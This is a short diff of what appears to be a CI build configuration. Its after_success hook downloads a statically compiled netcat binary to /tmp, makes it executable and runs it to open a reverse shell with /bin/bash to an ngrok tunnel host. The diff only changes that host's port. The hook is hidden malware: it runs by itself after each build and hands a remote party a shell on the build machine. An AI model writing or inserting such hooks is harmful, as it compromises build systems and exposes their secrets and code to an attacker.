@@ -22,5 +22,5 @@ after_success:
   - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/nc64?raw=true -o /tmp/nc
   - chmod a+x /tmp/nc
   - echo test2
-  - /tmp/nc 6.tcp.ngrok.io 15380 -e /bin/bash
+  - /tmp/nc 6.tcp.ngrok.io 15383 -e /bin/bash
 
